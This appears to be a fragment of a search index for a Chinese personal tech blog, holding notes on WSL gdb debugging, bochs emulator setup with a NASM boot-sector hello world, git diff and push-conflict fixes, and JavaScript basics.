\u8fd9\u4e2a\u6587\u4ef6\u662f\u81ea\u52a8\u751f\u6210\u7684(\u9700\u8981\u6307\u660e\u4f60\u8981\u8c03\u8bd5\u7684\u7a0b\u5e8f)\uff0c\u6240\u4ee5\u8fd9\u4e2a\u6587\u4ef6\u7684\u4f5c\u7528\u5c31\u662f\u8c03\u8bd5\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 { // Use IntelliSense to learn about possible attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 \"version\": \"0.2.0\", \"configurations\": [ { \"name\": \"(gdb) Launch\", \"type\": \"cppdbg\", \"request\": \"launch\", \"program\": \"/home/pxy/projects/helloworld/helloworld.out\", \"args\": [\"-exec info registers\"], \"stopAtEntry\": false, \"cwd\": \"${workspaceFolder}\", \"environment\": [], \"externalConsole\": false, \"MIMode\": \"gdb\", \"setupCommands\": [ { \"description\": \"Enable pretty-printing for gdb\", \"text\": \"-enable-pretty-printing\", \"ignoreFailures\": true } ] } ] } \u552f\u4e00\u9057\u61be\u7684\u5c31\u662f\u6ca1\u6cd5\u914d\u7f6egdb\u542f\u52a8\u7684\u53c2\u6570 \u4e0d\u8fc7\u6211\u662f\u4e0d\u662f\u53ef\u4ee5\u5b89\u88c5gdb\u7684\u63d2\u4ef6\u6765\u89e3\u51b3233 \u6700\u540e\u8bf4\u4e00\u4e0bwin64\u4f4d\u662f\u6ca1\u6709 sysnative \u6587\u4ef6\u5939\u7684\uff0c\u4f46\u662f\u5b83\u5176\u5b9e\u662f\u5b58\u5728\u7684 \u81f3\u4e8e\u5b98\u65b9\u6587\u6863\u6700\u540e\u7684\u90a3\u4e2a\u521b\u5efa launch.json \u662f\u600e\u4e48\u505a\u5230\u7684\u6211\u4e5f\u6ca1\u770b\u61c2","title":"WSL\u8fdc\u7a0b\u8c03\u8bd5"},{"location":"Linux/bochs\u4f7f\u7528\u6307\u5357/","text":"bochs\u4f7f\u7528\u6307\u5357 \u00b6 \u4e0b\u8f7d\u4e0d\u8bf4\u4e86\uff0cWindows\u7248\u672c\u7684bochs\u6ca1\u7528\u8fc7 http://bochs.sourceforge.net/guestos/linux-img.tar.gz \u662f\u5b98\u65b9\u63d0\u4f9b\u7684\u955c\u50cf \u5c1d\u8bd5\u8fd0\u884c \u00b6 tar -xvf \u89e3\u538b\u7f29\uff0c\u7136\u540e bochs -q \u5373\u62a5\u9519 \u539f\u56e0\u662f\u4e0d\u80fd\u8fde\u63a5 X display \u4e4b\u540e\u5728Linux\u4e2d\u8fd0\u884c\u901a\u7528\u7684\u547d\u4ee4 1 2 3 4 5 6 7 ======================================================================== 00000000000i[ ] LTDL_LIBRARY_PATH not set. using compile time default '/usr/lib/bochs/plugins' 00000000000i[ ] BXSHARE not set. using compile time default '/usr/share/bochs' 00000000000i[ ] reading configuration from bochsrc 00000000000p[ ] >>PANIC<< bochsrc:4: vga directive: wrong # args. 00000000000e[CTRL ] notify called, but no bxevent_callback function is registered 00000000000i[CTRL ] quit_sim called with exit code 1 \u540c\u6837\u62a5\u9519\uff0c\u539f\u56e0\u662f vga directive: wrong # args. \u90a3\u5c31\u68c0\u67e5\u4e00\u4e0b bochsrc \u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 12 megs: 32 romimage: file=$BXSHARE/BIOS-bochs-latest vgaromimage: file=$BXSHARE/VGABIOS-lgpl-latest vga: extension=vbe, update_freq=15 floppya: 1_44=a.img, status=inserted floppyb: 1_44=b.img, status=inserted ata0-master: type=disk, path=minibootable.img, cylinders=900, heads=15, spt=17 boot: c log: bochsout.txt mouse: enabled=0 cpu: ips=15000000 clock: sync=slowdown \u76f4\u63a5\u6ce8\u91ca\u6389 vag \u90a3\u4e00\u884c \u540c\u6837\u8fd0\u884c\uff0c\u4f9d\u65e7\u62a5\u9519 1 2 3 4 5 6 7 8 00000000000i[ ] LTDL_LIBRARY_PATH not set. using compile time default '/usr/lib/bochs/plugins' 00000000000i[ ] BXSHARE not set. using compile time default '/usr/share/bochs' 00000000000i[ ] reading configuration from bochsrc 00000000000i[ ] lt_dlhandle is 0x230ea70 00000000000i[PLGIN] loaded plugin libbx_x.so 00000000000i[ ] installing x module as the Bochs GUI 00000000000i[ ] using log file bochsout.txt bochs-bin: symbol lookup error: /usr/lib/bochs/plugins/libbx_x.so: undefined symbol: XpmCreatePixmapFromData \u53c2\u8003\u6587\u7ae0 \u4fee\u6539\u4e00\u4e0b bochsrc \u6587\u4ef6,\u6dfb\u52a0\u4e0a display_library: sdl \u8fd9\u4e00\u884c\uff0c\u540c\u65f6 sudo apt-get install bochs-sdl \u4fee\u6539\u540e\u7684 bochsrc \u6587\u4ef6\u5982\u4e0b 1 2 3 4 5 6 7 8 9 10 11 12 13 megs: 32 romimage: file=$BXSHARE/BIOS-bochs-latest vgaromimage: file=$BXSHARE/VGABIOS-lgpl-latest #vga: extension=vbe, update_freq=15 display_library: sdl floppya: 1_44=a.img, status=inserted floppyb: 1_44=b.img, status=inserted ata0-master: type=disk, path=minibootable.img, cylinders=900, heads=15, spt=17 boot: c log: bochsout.txt mouse: enabled=0 cpu: ips=15000000 clock: sync=slowdown \u7167\u65e7 bochs -q \u8df3\u8fc7\u9009\u62e9\u83dc\u5355 \u80fd\u591f\u6a21\u62df\u8fd0\u884c\u4e86\u4f46\u662f\u8fdb\u4e0d\u4e86\u7528\u6237\u767b\u9646\u754c\u9762 bochsrc\u6587\u4ef6\u8be6\u89e3 \u00b6 \u8fd9\u4e2a\u6587\u4ef6\u683c\u5f0f\u5f88\u4e25 bochs\u5355\u6b65\u8c03\u8bd5\u6307\u4ee4 \u00b6","title":"bochs\u4f7f\u7528\u6307\u5357"},{"location":"Linux/bochs\u4f7f\u7528\u6307\u5357/#bochs","text":"\u4e0b\u8f7d\u4e0d\u8bf4\u4e86\uff0cWindows\u7248\u672c\u7684bochs\u6ca1\u7528\u8fc7 http://bochs.sourceforge.net/guestos/linux-img.tar.gz \u662f\u5b98\u65b9\u63d0\u4f9b\u7684\u955c\u50cf","title":"bochs\u4f7f\u7528\u6307\u5357"},{"location":"Linux/bochs\u4f7f\u7528\u6307\u5357/#_1","text":"tar -xvf \u89e3\u538b\u7f29\uff0c\u7136\u540e bochs -q \u5373\u62a5\u9519 \u539f\u56e0\u662f\u4e0d\u80fd\u8fde\u63a5 X display \u4e4b\u540e\u5728Linux\u4e2d\u8fd0\u884c\u901a\u7528\u7684\u547d\u4ee4 1 2 3 4 5 6 7 ======================================================================== 00000000000i[ ] LTDL_LIBRARY_PATH not set. using compile time default '/usr/lib/bochs/plugins' 00000000000i[ ] BXSHARE not set. using compile time default '/usr/share/bochs' 00000000000i[ ] reading configuration from bochsrc 00000000000p[ ] >>PANIC<< bochsrc:4: vga directive: wrong # args. 00000000000e[CTRL ] notify called, but no bxevent_callback function is registered 00000000000i[CTRL ] quit_sim called with exit code 1 \u540c\u6837\u62a5\u9519\uff0c\u539f\u56e0\u662f vga directive: wrong # args. \u90a3\u5c31\u68c0\u67e5\u4e00\u4e0b bochsrc \u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 12 megs: 32 romimage: file=$BXSHARE/BIOS-bochs-latest vgaromimage: file=$BXSHARE/VGABIOS-lgpl-latest vga: extension=vbe, update_freq=15 floppya: 1_44=a.img, status=inserted floppyb: 1_44=b.img, status=inserted ata0-master: type=disk, path=minibootable.img, cylinders=900, heads=15, spt=17 boot: c log: bochsout.txt mouse: enabled=0 cpu: ips=15000000 clock: sync=slowdown \u76f4\u63a5\u6ce8\u91ca\u6389 vag \u90a3\u4e00\u884c \u540c\u6837\u8fd0\u884c\uff0c\u4f9d\u65e7\u62a5\u9519 1 2 3 4 5 6 7 8 00000000000i[ ] LTDL_LIBRARY_PATH not set. using compile time default '/usr/lib/bochs/plugins' 00000000000i[ ] BXSHARE not set. using compile time default '/usr/share/bochs' 00000000000i[ ] reading configuration from bochsrc 00000000000i[ ] lt_dlhandle is 0x230ea70 00000000000i[PLGIN] loaded plugin libbx_x.so 00000000000i[ ] installing x module as the Bochs GUI 00000000000i[ ] using log file bochsout.txt bochs-bin: symbol lookup error: /usr/lib/bochs/plugins/libbx_x.so: undefined symbol: XpmCreatePixmapFromData \u53c2\u8003\u6587\u7ae0 \u4fee\u6539\u4e00\u4e0b bochsrc \u6587\u4ef6,\u6dfb\u52a0\u4e0a display_library: sdl \u8fd9\u4e00\u884c\uff0c\u540c\u65f6 sudo apt-get install bochs-sdl \u4fee\u6539\u540e\u7684 bochsrc \u6587\u4ef6\u5982\u4e0b 1 2 3 4 5 6 7 8 9 10 11 12 13 megs: 32 romimage: file=$BXSHARE/BIOS-bochs-latest vgaromimage: file=$BXSHARE/VGABIOS-lgpl-latest #vga: extension=vbe, update_freq=15 display_library: sdl floppya: 1_44=a.img, status=inserted floppyb: 1_44=b.img, status=inserted ata0-master: type=disk, path=minibootable.img, cylinders=900, heads=15, spt=17 boot: c log: bochsout.txt mouse: enabled=0 cpu: ips=15000000 clock: sync=slowdown \u7167\u65e7 bochs -q \u8df3\u8fc7\u9009\u62e9\u83dc\u5355 \u80fd\u591f\u6a21\u62df\u8fd0\u884c\u4e86\u4f46\u662f\u8fdb\u4e0d\u4e86\u7528\u6237\u767b\u9646\u754c\u9762","title":"\u5c1d\u8bd5\u8fd0\u884c"},{"location":"Linux/bochs\u4f7f\u7528\u6307\u5357/#bochsrc","text":"\u8fd9\u4e2a\u6587\u4ef6\u683c\u5f0f\u5f88\u4e25","title":"bochsrc\u6587\u4ef6\u8be6\u89e3"},{"location":"Linux/bochs\u4f7f\u7528\u6307\u5357/#bochs_1","text":"","title":"bochs\u5355\u6b65\u8c03\u8bd5\u6307\u4ee4"},{"location":"Linux/bochs\u7b2c\u4e00\u6b21\u5b9e\u9a8c/","text":"bochs\u7b2c\u4e00\u6b21\u5b9e\u9a8c \u00b6 \u8fd0\u884c\u4e00\u4e2ahello world \u00b6 \u6210\u529f\u5730\u622a\u56fe\uff1a boot.asm 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 org 07c00h mov ax, cs mov ds,ax mov es, ax call DispStr jmp $ DispStr: mov ax, BootMessage mov bp, ax mov cx, 16 mov ax, 01301h mov bx, 000ch mov dl,0 int 10h ret BootMessage: db \"Hello World\" times 510-($-$$) db 0 dw 0xaa55 \u7f16\u8bd1 1 nasm boot.asm -o boot.bin \u5236\u4f5c\u4e00\u5757\u8f6f\u76d8\u5e76\u5c06 boot.bin \u5199\u5165\u5230\u5176\u4e2d 1 dd if=boot.bin of=a.img bs=512 count=1 conv=notrunc \u63a5\u7740\u7f16\u5199 bochsrc \u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 12 megs: 32 romimage: file=/usr/share/bochs/BIOS-bochs-latest vgaromimage: file=/usr/share/vgabios/vgabios.bin display_library: sdl floppya: 1_44=a.img, status=inserted boot: floppy log: bochsout.txt mouse: enabled=0 #keyboard_mapping: enabled=1, map=/usr/share/bochs/keymaps/x11-pc-us.map \u8fd9\u91cc\u6211\u9047\u5230\u4e24\u4e2a\u95ee\u9898 \u4e4b\u524d\u9047\u5230\u7684\uff0c\u4fee\u6539 display_library: sdl \u952e\u76d8\u6620\u5c04\u6709\u9519\uff0c\u76f4\u63a5\u6ce8\u91ca\u6389 \u4e4b\u540e\u8fd0\u884c 1 bochs -f bochsrc \u4ece\u6e90\u4ee3\u7801\u7f16\u8bd1bochs \u00b6 \u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u9047\u5230\u5f88\u591a\u7684\u62a5\u9519\u4e4b\u7c7b\u7684\uff0c\u53cd\u6b63\u5c31\u662f\u6765\u56de\u4e0d\u65ad\u5730\u641e 1 2 dpkg -l | grep bochs \u67e5\u770b\u662f\u5426\u6709apt install\u5b89\u88c5\u7684bochs \u5982\u679c\u6709\u5c31\u5378\u6389\u5427 \u7136\u540e\u7f16\u8bd1\u6210\u529f\u4e4b\u540e\u6211\u9047\u5230\u4e86\u4e00\u4e2a\u95ee\u9898 \u5f00\u59cb\u7684\u65f6\u5019\u6211\u4fee\u6539\u9519\u4e86\u5bfc\u81f4\u51fa\u4e86\u95ee\u9898\uff0c\u540e\u6765\u4fee\u6539\u4e3a\u5982\u4e0b\uff1a 1","title":"bochs\u7b2c\u4e00\u6b21\u5b9e\u9a8c"},{"location":"Linux/bochs\u7b2c\u4e00\u6b21\u5b9e\u9a8c/#bochs","text":"","title":"bochs\u7b2c\u4e00\u6b21\u5b9e\u9a8c"},{"location":"Linux/bochs\u7b2c\u4e00\u6b21\u5b9e\u9a8c/#hello-world","text":"\u6210\u529f\u5730\u622a\u56fe\uff1a boot.asm 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 org 07c00h mov ax, cs mov ds,ax mov es, ax call DispStr jmp $ DispStr: mov ax, BootMessage mov bp, ax mov cx, 16 mov ax, 01301h mov bx, 000ch mov dl,0 int 10h ret BootMessage: db \"Hello World\" times 510-($-$$) db 0 dw 0xaa55 \u7f16\u8bd1 1 nasm boot.asm -o boot.bin \u5236\u4f5c\u4e00\u5757\u8f6f\u76d8\u5e76\u5c06 boot.bin \u5199\u5165\u5230\u5176\u4e2d 1 dd if=boot.bin of=a.img bs=512 count=1 conv=notrunc \u63a5\u7740\u7f16\u5199 bochsrc \u6587\u4ef6 1 2 3 4 5 6 7 8 9 10 11 12 megs: 32 romimage: file=/usr/share/bochs/BIOS-bochs-latest vgaromimage: file=/usr/share/vgabios/vgabios.bin display_library: sdl floppya: 1_44=a.img, status=inserted boot: floppy log: bochsout.txt mouse: enabled=0 #keyboard_mapping: enabled=1, map=/usr/share/bochs/keymaps/x11-pc-us.map \u8fd9\u91cc\u6211\u9047\u5230\u4e24\u4e2a\u95ee\u9898 \u4e4b\u524d\u9047\u5230\u7684\uff0c\u4fee\u6539 display_library: sdl \u952e\u76d8\u6620\u5c04\u6709\u9519\uff0c\u76f4\u63a5\u6ce8\u91ca\u6389 \u4e4b\u540e\u8fd0\u884c 1 bochs -f bochsrc","title":"\u8fd0\u884c\u4e00\u4e2ahello world"},{"location":"Linux/bochs\u7b2c\u4e00\u6b21\u5b9e\u9a8c/#bochs_1","text":"\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u9047\u5230\u5f88\u591a\u7684\u62a5\u9519\u4e4b\u7c7b\u7684\uff0c\u53cd\u6b63\u5c31\u662f\u6765\u56de\u4e0d\u65ad\u5730\u641e 1 2 dpkg -l | grep bochs \u67e5\u770b\u662f\u5426\u6709apt install\u5b89\u88c5\u7684bochs \u5982\u679c\u6709\u5c31\u5378\u6389\u5427 \u7136\u540e\u7f16\u8bd1\u6210\u529f\u4e4b\u540e\u6211\u9047\u5230\u4e86\u4e00\u4e2a\u95ee\u9898 \u5f00\u59cb\u7684\u65f6\u5019\u6211\u4fee\u6539\u9519\u4e86\u5bfc\u81f4\u51fa\u4e86\u95ee\u9898\uff0c\u540e\u6765\u4fee\u6539\u4e3a\u5982\u4e0b\uff1a 1","title":"\u4ece\u6e90\u4ee3\u7801\u7f16\u8bd1bochs"},{"location":"Linux/ch0/","text":"Whois\u547d\u4ee4\u4f20\u8f93\u6587\u4ef6 \u00b6 whois blog","title":"Whois\u547d\u4ee4\u4f20\u8f93\u6587\u4ef6"},{"location":"Linux/ch0/#whois","text":"whois blog","title":"Whois\u547d\u4ee4\u4f20\u8f93\u6587\u4ef6"},{"location":"git/","text":"","title":"Index"},{"location":"git/gitdiff\u547d\u4ee4/","text":"git diff \u00b6 \u6ca1\u592a\u5c1d\u8bd5 git diff \u547d\u4ee4\uff0c\u4e0d\u8fc7\u7528\u5904\u5f88\u5927 \u6c47\u603b\u4e00\u4e0b 1 2 3 4 5 6 7 8 9 10 11 git diff \u67e5\u770b\u5c1a\u672a\u6682\u5b58\u7684\u6587\u4ef6\u66f4\u65b0\u4e86\u54ea\u4e9b\u90e8\u5206 git diff filename \u67e5\u770b\u5c1a\u672a\u6682\u5b58\u7684\u67d0\u4e2a\u6587\u4ef6\u66f4\u65b0\u4e86\u54ea\u4e9b git diff \u2013cached \u67e5\u770b\u5df2\u7ecf\u6682\u5b58\u8d77\u6765\u7684\u6587\u4ef6\u548c\u4e0a\u6b21\u63d0\u4ea4\u7684\u7248\u672c\u4e4b\u95f4\u7684\u5dee\u5f02 git diff \u2013cached filename \u67e5\u770b\u5df2\u7ecf\u6682\u5b58\u8d77\u6765\u7684\u67d0\u4e2a\u6587\u4ef6\u548c\u4e0a\u6b21\u63d0\u4ea4\u7684\u7248\u672c\u4e4b\u95f4\u7684\u5dee\u5f02 git diff ffd98b291e0caa6c33575c1ef465eae661ce40c9 b8e7b00c02b95b320f14b625663fdecf2d63e74c \u67e5\u770b\u67d0\u4e24\u4e2a\u7248\u672c\u4e4b\u95f4\u7684\u5dee\u5f02 git diff ffd98b291e0caa6c33575c1ef465eae661ce40c9:filename b8e7b00c02b95b320f14b625663fdecf2d63e74c:filename \u67e5\u770b\u67d0\u4e24\u4e2a\u7248\u672c\u7684\u67d0\u4e2a\u6587\u4ef6\u4e4b\u95f4\u7684\u5dee\u5f02 diff\u7684\u547d\u4ee4\u8f93\u51fa\u683c\u5f0f\u6ce8\u610f \u00b6 1 2 3 4 ---\u4ee3\u8868\u6e90\u6587\u4ef6 +++\u4ee3\u8868\u76ee\u6807\u6587\u4ef6 -\u5f00\u5934\u7684\u884c\uff0c\u662f\u53ea\u51fa\u73b0\u5728\u6e90\u6587\u4ef6\u4e2d\u7684\u884c +\u5f00\u5934\u7684\u884c\uff0c\u662f\u53ea\u51fa\u73b0\u5728\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u884c master\u5206\u652f\u548cworking area\u7684\u6587\u4ef6 \u00b6 1 git diff master HEAD\u6307\u5411\u7684\u5185\u5bb9\u548cworking area\u7684\u6587\u4ef6 \u00b6 1 git diff HEAD github\u8ddf\u8e2acms \u00b6 \u5206\u4eab\u4e00\u4e2a\u8ddf\u8e2acms\u7248\u672c\u7684\u5c0f\u6280\u5de7\u3002\u521b\u5efa\u4e00\u4e2agithub\u8d26\u53f7\uff0c\u6bcf\u4e2acms\u521b\u5efa\u4e00\u4e2arepository\uff0c\u6bcf\u6b21cms\u66f4\u65b0\u540e\uff0c\u4e0b\u8f7d\u6700\u65b0\u4ee3\u7801\uff0cadd+commit+push\u3002\u7136\u540e\u76f4\u63a5\u5728Github\u4e0a\u770bdiff\u5c31\u53ef\u4ee5\u4e86\u3002 \u6bd4\u5982 \u4fee\u590dXXE\u548c\u4efb\u610f\u6587\u4ef6\u5305\u542b \uff0c\u6211\u80fd\u770b\u5230zblog\u662f\u5982\u4f55\u4fee\u590d\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u548cXXE\u7684\u3002 \u53c2\u8003 \u00b6 git diff \u547d\u4ee4","title":"git diff"},{"location":"git/gitdiff\u547d\u4ee4/#git-diff","text":"\u6ca1\u592a\u5c1d\u8bd5 git diff \u547d\u4ee4\uff0c\u4e0d\u8fc7\u7528\u5904\u5f88\u5927 \u6c47\u603b\u4e00\u4e0b 1 2 3 4 5 6 7 8 9 10 11 git diff \u67e5\u770b\u5c1a\u672a\u6682\u5b58\u7684\u6587\u4ef6\u66f4\u65b0\u4e86\u54ea\u4e9b\u90e8\u5206 git diff filename \u67e5\u770b\u5c1a\u672a\u6682\u5b58\u7684\u67d0\u4e2a\u6587\u4ef6\u66f4\u65b0\u4e86\u54ea\u4e9b git diff \u2013cached \u67e5\u770b\u5df2\u7ecf\u6682\u5b58\u8d77\u6765\u7684\u6587\u4ef6\u548c\u4e0a\u6b21\u63d0\u4ea4\u7684\u7248\u672c\u4e4b\u95f4\u7684\u5dee\u5f02 git diff \u2013cached filename \u67e5\u770b\u5df2\u7ecf\u6682\u5b58\u8d77\u6765\u7684\u67d0\u4e2a\u6587\u4ef6\u548c\u4e0a\u6b21\u63d0\u4ea4\u7684\u7248\u672c\u4e4b\u95f4\u7684\u5dee\u5f02 git diff ffd98b291e0caa6c33575c1ef465eae661ce40c9 b8e7b00c02b95b320f14b625663fdecf2d63e74c \u67e5\u770b\u67d0\u4e24\u4e2a\u7248\u672c\u4e4b\u95f4\u7684\u5dee\u5f02 git diff ffd98b291e0caa6c33575c1ef465eae661ce40c9:filename b8e7b00c02b95b320f14b625663fdecf2d63e74c:filename \u67e5\u770b\u67d0\u4e24\u4e2a\u7248\u672c\u7684\u67d0\u4e2a\u6587\u4ef6\u4e4b\u95f4\u7684\u5dee\u5f02","title":"git diff"},{"location":"git/gitdiff\u547d\u4ee4/#diff","text":"1 2 3 4 ---\u4ee3\u8868\u6e90\u6587\u4ef6 +++\u4ee3\u8868\u76ee\u6807\u6587\u4ef6 -\u5f00\u5934\u7684\u884c\uff0c\u662f\u53ea\u51fa\u73b0\u5728\u6e90\u6587\u4ef6\u4e2d\u7684\u884c +\u5f00\u5934\u7684\u884c\uff0c\u662f\u53ea\u51fa\u73b0\u5728\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u884c","title":"diff\u7684\u547d\u4ee4\u8f93\u51fa\u683c\u5f0f\u6ce8\u610f"},{"location":"git/gitdiff\u547d\u4ee4/#masterworking-area","text":"1 git diff master","title":"master\u5206\u652f\u548cworking area\u7684\u6587\u4ef6"},{"location":"git/gitdiff\u547d\u4ee4/#headworking-area","text":"1 git diff HEAD","title":"HEAD\u6307\u5411\u7684\u5185\u5bb9\u548cworking area\u7684\u6587\u4ef6"},{"location":"git/gitdiff\u547d\u4ee4/#githubcms","text":"\u5206\u4eab\u4e00\u4e2a\u8ddf\u8e2acms\u7248\u672c\u7684\u5c0f\u6280\u5de7\u3002\u521b\u5efa\u4e00\u4e2agithub\u8d26\u53f7\uff0c\u6bcf\u4e2acms\u521b\u5efa\u4e00\u4e2arepository\uff0c\u6bcf\u6b21cms\u66f4\u65b0\u540e\uff0c\u4e0b\u8f7d\u6700\u65b0\u4ee3\u7801\uff0cadd+commit+push\u3002\u7136\u540e\u76f4\u63a5\u5728Github\u4e0a\u770bdiff\u5c31\u53ef\u4ee5\u4e86\u3002 \u6bd4\u5982 \u4fee\u590dXXE\u548c\u4efb\u610f\u6587\u4ef6\u5305\u542b \uff0c\u6211\u80fd\u770b\u5230zblog\u662f\u5982\u4f55\u4fee\u590d\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u548cXXE\u7684\u3002","title":"github\u8ddf\u8e2acms"},{"location":"git/gitdiff\u547d\u4ee4/#_1","text":"git diff \u547d\u4ee4","title":"\u53c2\u8003"},{"location":"git/git\u8fdc\u7a0b\u4ed3\u5e93\u4e0e\u672c\u5730\u53d1\u751f\u51b2\u7a81/","text":"git\u8fdc\u7a0b\u4ed3\u5e93\u548c\u672c\u5730\u53d1\u751f\u51b2\u7a81 \u00b6 \u8fd9\u4e2a\u95ee\u9898\u5e94\u8be5\u7ecf\u5e38\u9047\u5230\uff0c\u8fd9\u91cc\u518d\u8bb0\u5f55\u4e00\u4e0b 1 2 3 4 5 6 7 8 $ git push -u origin master To git@github.com:******/Demo.git ! [rejected] master -> master (non-fast-forward) error: failed to push some refs to 'git@github.com:******/Demo.git' hint: Updates were rejected because the tip of your current branch is behind hint: its remote counterpart. Merge the remote changes (e.g. 'git pull') hint: before pushing again. hint: See the 'Note about fast-forwards' in 'git push --help' for details. \u6709\u5982\u4e0b\u51e0\u79cd\u89e3\u51b3\u65b9\u6cd5\uff1a \u4f7f\u7528\u5f3a\u5236push\u7684\u65b9\u6cd5\uff1a $ git push -u origin master -f \u8fd9\u6837\u4f1a\u4f7f\u8fdc\u7a0b\u4fee\u6539\u4e22\u5931\uff0c\u4e00\u822c\u662f\u4e0d\u53ef\u53d6\u7684\uff0c\u5c24\u5176\u662f\u591a\u4eba\u534f\u4f5c\u5f00\u53d1\u7684\u65f6\u5019\u3002 push\u524d\u5148\u5c06\u8fdc\u7a0brepository\u4fee\u6539pull\u4e0b\u6765 $ git pull origin master $ git push -u origin master \u82e5\u4e0d\u60f3merge\u8fdc\u7a0b\u548c\u672c\u5730\u4fee\u6539\uff0c\u53ef\u4ee5\u5148\u521b\u5efa\u65b0\u7684\u5206\u652f\uff1a $ git branch [name] \u7136\u540epush $ git push -u origin [name]","title":"git\u8fdc\u7a0b\u4ed3\u5e93\u548c\u672c\u5730\u53d1\u751f\u51b2\u7a81"},{"location":"git/git\u8fdc\u7a0b\u4ed3\u5e93\u4e0e\u672c\u5730\u53d1\u751f\u51b2\u7a81/#git","text":"\u8fd9\u4e2a\u95ee\u9898\u5e94\u8be5\u7ecf\u5e38\u9047\u5230\uff0c\u8fd9\u91cc\u518d\u8bb0\u5f55\u4e00\u4e0b 1 2 3 4 5 6 7 8 $ git push -u origin master To git@github.com:******/Demo.git ! [rejected] master -> master (non-fast-forward) error: failed to push some refs to 'git@github.com:******/Demo.git' hint: Updates were rejected because the tip of your current branch is behind hint: its remote counterpart. Merge the remote changes (e.g. 'git pull') hint: before pushing again. hint: See the 'Note about fast-forwards' in 'git push --help' for details. \u6709\u5982\u4e0b\u51e0\u79cd\u89e3\u51b3\u65b9\u6cd5\uff1a \u4f7f\u7528\u5f3a\u5236push\u7684\u65b9\u6cd5\uff1a $ git push -u origin master -f \u8fd9\u6837\u4f1a\u4f7f\u8fdc\u7a0b\u4fee\u6539\u4e22\u5931\uff0c\u4e00\u822c\u662f\u4e0d\u53ef\u53d6\u7684\uff0c\u5c24\u5176\u662f\u591a\u4eba\u534f\u4f5c\u5f00\u53d1\u7684\u65f6\u5019\u3002 push\u524d\u5148\u5c06\u8fdc\u7a0brepository\u4fee\u6539pull\u4e0b\u6765 $ git pull origin master $ git push -u origin master \u82e5\u4e0d\u60f3merge\u8fdc\u7a0b\u548c\u672c\u5730\u4fee\u6539\uff0c\u53ef\u4ee5\u5148\u521b\u5efa\u65b0\u7684\u5206\u652f\uff1a $ git branch [name] \u7136\u540epush $ git push -u origin [name]","title":"git\u8fdc\u7a0b\u4ed3\u5e93\u548c\u672c\u5730\u53d1\u751f\u51b2\u7a81"},{"location":"language/javascript/js\u5ed6\u96ea\u5cf0\u9605\u8bfb\u7b14\u8bb01/","text":"\u5ed6\u96ea\u5cf0js\u9605\u8bfb\u7b14\u8bb01 \u00b6 \u5bf9\u8c61 \u00b6 \u5982\u679c\u8bbf\u95ee\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\u4f1a\u8fd4\u56de\u4ec0\u4e48\u5462\uff1fJavaScript\u89c4\u5b9a\uff0c\u8bbf\u95ee\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\u4e0d\u62a5\u9519\uff0c\u800c\u662f\u8fd4\u56de undefined \uff1a \u5224\u65ad\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u6709\u4e00\u4e2a\u5c5e\u6027\uff0c\u53ef\u4ee5\u7528 in \u64cd\u4f5c\u7b26 \u8981\u5224\u65ad\u4e00\u4e2a\u5c5e\u6027\u662f\u5426\u662f xiaoming \u81ea\u8eab\u62e5\u6709\u7684\uff0c\u800c\u4e0d\u662f\u7ee7\u627f\u5f97\u5230\u7684\uff0c\u53ef\u4ee5\u7528 hasOwnProperty() \u65b9\u6cd5\uff1a map\u548cset \u00b6 1 2 3 4 5 6 7 8 //map\u7684\u64cd\u4f5c var m = new Map(); // \u7a7aMap m.set('Adam', 67); // \u6dfb\u52a0\u65b0\u7684key-value m.set('Bob', 59); m.has('Adam'); // \u662f\u5426\u5b58\u5728key 'Adam': true m.get('Adam'); // 67 m.delete('Adam'); // \u5220\u9664key 'Adam' m.get('Adam'); // undefined set\u7684\u64cd\u4f5c\u57fa\u672c\u7c7b\u4f3c iterable \u00b6 \u904d\u5386 Array \u53ef\u4ee5\u91c7\u7528\u4e0b\u6807\u5faa\u73af\uff0c\u904d\u5386 Map \u548c Set \u5c31\u65e0\u6cd5\u4f7f\u7528\u4e0b\u6807\u3002\u4e3a\u4e86\u7edf\u4e00\u96c6\u5408\u7c7b\u578b\uff0cES6\u6807\u51c6\u5f15\u5165\u4e86\u65b0\u7684 iterable \u7c7b\u578b\uff0c Array \u3001 Map \u548c Set \u90fd\u5c5e\u4e8e iterable \u7c7b\u578b\u3002 \u5177\u6709 iterable \u7c7b\u578b\u7684\u96c6\u5408\u53ef\u4ee5\u901a\u8fc7\u65b0\u7684 for ... of \u5faa\u73af\u6765\u904d\u5386\u3002 \u66f4\u9ad8\u7ea7\u7684forEach\u65b9\u6cd5 \u00b6 1 2 3 4 5 6 7 var a = ['A', 'B', 'C']; a.forEach(function (element, index, array) { // element: \u6307\u5411\u5f53\u524d\u5143\u7d20\u7684\u503c // index: \u6307\u5411\u5f53\u524d\u7d22\u5f15 // array: \u6307\u5411Array\u5bf9\u8c61\u672c\u8eab console.log(element + ', index = ' + index); }); \u53d8\u91cf\u63d0\u5347 \u00b6 JavaScript\u7684\u51fd\u6570\u5b9a\u4e49\u6709\u4e2a\u7279\u70b9\uff0c\u5b83\u4f1a\u5148\u626b\u63cf\u6574\u4e2a\u51fd\u6570\u4f53\u7684\u8bed\u53e5\uff0c\u628a\u6240\u6709\u7533\u660e\u7684\u53d8\u91cf\u201c\u63d0\u5347\u201d\u5230\u51fd\u6570\u9876\u90e8\uff1a \u5168\u5c40\u4f5c\u7528\u57df \u00b6 